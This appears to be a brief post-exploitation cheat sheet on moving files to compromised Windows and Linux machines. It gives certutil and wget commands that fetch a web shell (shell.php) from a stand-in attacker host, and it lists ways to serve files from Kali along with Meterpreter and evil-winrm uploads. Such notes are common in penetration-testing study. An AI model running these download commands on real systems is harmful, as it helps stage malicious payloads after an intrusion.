https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/  
https://www.verylazytech.com/post-exploitation/file-transfer-cheatsheet-windows-and-linux  

**On Windows**:  
**Downloads**:  
certutil.exe -urlcache -f http://kali.ip/shell.php   

**on Linux**:  
**Downloads**:  
wget http://kali.ip/shell.php  

**On Kali**:  
**Hosting WEB/FTP server**    
python -m http.server 80   //on given port in current directory  
python -m pyftpdlib 21   //ftp 10.10.10.10  
Metasploit: meterpreter shell has file upload download feature  
evilwinrm - also provides file upload  

